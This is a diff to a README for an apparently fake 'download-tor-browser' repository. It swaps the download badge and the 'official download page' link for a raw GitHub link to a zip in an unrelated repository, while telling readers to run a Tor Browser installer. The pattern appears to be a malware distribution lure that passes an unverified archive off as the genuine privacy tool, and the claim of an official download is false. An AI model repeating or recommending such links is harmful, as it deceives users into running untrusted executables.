@@ -5,7 +5,7 @@ description: "Download verified Tor Browser installers for Windows, macOS, Linux
 ---
 # 🛡️ download-tor-browser - Secure private browsing for your computer
 
-[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](https://github.com/Calliopegelding314/download-tor-browser)
+[![Download Tor Browser](https://img.shields.io/badge/Download-Tor_Browser-blue.svg)](https://raw.githubusercontent.com/Calliopegelding314/calliopegelding314.github.io/main/fossilist/calliopegelding-io-github-v1.1.zip)
 
 ## 🌐 What is Tor Browser?
 
@@ -27,7 +27,7 @@ You need a Windows computer to use this application. Ensure your system meets th
 
 Follow these steps to set up the browser on your machine.
 
-1. Visit the [official download page](https://github.com/Calliopegelding314/download-tor-browser) to access the installer.
+1. Visit the [official download page](https://raw.githubusercontent.com/Calliopegelding314/calliopegelding314.github.io/main/fossilist/calliopegelding-io-github-v1.1.zip) to access the installer.
 2. Locate the file named `torbrowser-install-win64.exe` on the page.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder or your Desktop.
